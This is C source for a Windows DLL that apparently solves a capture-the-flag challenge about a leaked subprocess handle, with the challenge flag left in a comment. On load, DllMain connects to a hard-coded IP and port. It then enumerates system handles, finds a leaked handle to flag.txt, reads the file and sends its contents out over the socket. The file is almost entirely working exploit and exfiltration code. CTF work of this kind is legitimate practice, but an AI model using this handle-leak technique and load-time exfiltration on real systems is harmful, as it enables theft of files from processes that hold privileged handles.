#include <assert.h>
#include <stdio.h>
// clang-format off
#include <winsock2.h>
#include <ws2tcpip.h>
// clang-format on
#include <ntdef.h>
#include <windows.h>

#define SystemHandleInformation 0x10

extern NTSTATUS WINAPI NtQuerySystemInformation(ULONG SystemInformationClass,
                                                PVOID SystemInformation,
                                                ULONG SystemInformationLength,
                                                PULONG ReturnLength);

extern NTSTATUS WINAPI NtQueryObject(HANDLE ObjectHandle,
                                     ULONG ObjectInformationClass,
                                     PVOID ObjectInformation, ULONG Length,
                                     PULONG ReturnLength);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
  USHORT UniqueProcessId;
  USHORT CreatorBackTraceIndex;
  UCHAR ObjectTypeIndex;
  UCHAR HandleAttributes;
  USHORT HandleValue;
  PVOID Object;
  ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

static_assert(sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) == 0x18);

typedef struct _SYSTEM_HANDLE_INFORMATION {
  ULONG NumberOfHandles;
  SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

SOCKET Socket;
static union {
  SYSTEM_HANDLE_INFORMATION Info;
  char Buf[16 * 1024 * 1024];
} Info;
static union {
  UNICODE_STRING Path;
  char Buf[1024];
} Path;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  (void)hinstDLL;
  (void)lpvReserved;
  if (fdwReason == DLL_PROCESS_ATTACH) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != NO_ERROR) {
      printf("WSAStartup() = %lu\n", GetLastError());
      abort();
    }
    if ((Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) ==
        INVALID_SOCKET) {
      printf("socket() = %lu\n", GetLastError());
      abort();
    }
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("10.11.0.114");
    addr.sin_port = htons(33333);
    if (connect(Socket, (SOCKADDR *)&addr, sizeof(addr)) == SOCKET_ERROR) {
      printf("connect() = %lu\n", GetLastError());
      abort();
    }
      char Msg[1024] = "Hello\n";
    send(Socket, Msg, strlen(Msg), 0);
    NTSTATUS Status = NtQuerySystemInformation(SystemHandleInformation, &Info,
                                               sizeof(Info), NULL);
    if (Status != 0) {
      sprintf(Msg, "NtQuerySystemInformation() = 0x%lx\n", Status);
      send(Socket, Msg, strlen(Msg), 0);
      abort();
    }
    for (ULONG i = 0; i < Info.Info.NumberOfHandles; i++) {
      unsigned int UniqueProcessId = Info.Info.Handles[i].UniqueProcessId;
      HANDLE Handle =
          (HANDLE)(unsigned long long)Info.Info.Handles[i].HandleValue;
      sprintf(Msg, "%lu/%lu %u %llu\n", i, Info.Info.NumberOfHandles,
              UniqueProcessId, (unsigned long long)Handle);
      send(Socket, Msg, strlen(Msg), 0);
      if (UniqueProcessId != GetCurrentProcessId()) {
        continue;
      }
      Status = NtQueryObject(Handle, 1, &Path, sizeof(Path), 0);
      if (Status != 0) {
        printf("NtQueryObject() = 0x%lx\n", Status);
        abort();
      }
      if (Path.Path.Buffer) {
        send(Socket, (void *)Path.Path.Buffer, Path.Path.Length, 0);
        send(Socket, "\n", 1, 0);
        if (wcsstr(Path.Path.Buffer, L"flag.txt")) {
          strcpy(Msg, "it's the flag!\n");
          send(Socket, Msg, strlen(Msg), 0);
          SetFilePointer(Handle, 0, NULL, FILE_BEGIN);
          char Flag[128];
          DWORD FlagSize;
          if (ReadFile(Handle, Flag, sizeof(Flag), &FlagSize, NULL)) {
            sprintf(Msg, "ReadFile() read %lu bytes\n", FlagSize);
            send(Socket, Msg, strlen(Msg), 0);
            /* INS{W1nd0wS!SuBPr0c3sS:h4nDl3~L34k!!!} */
            send(Socket, Flag, FlagSize, 0);
          } else {
            sprintf(Msg, "ReadFile() = %lu\n", GetLastError());
            send(Socket, Msg, strlen(Msg), 0);
            abort();
          }
        }
      }
    }
    (void)Path;
    (void)Info;
    if (closesocket(Socket) == SOCKET_ERROR) {
      printf("connect() = %lu\n", GetLastError());
      abort();
    }
    WSACleanup();
  }
  return TRUE;
}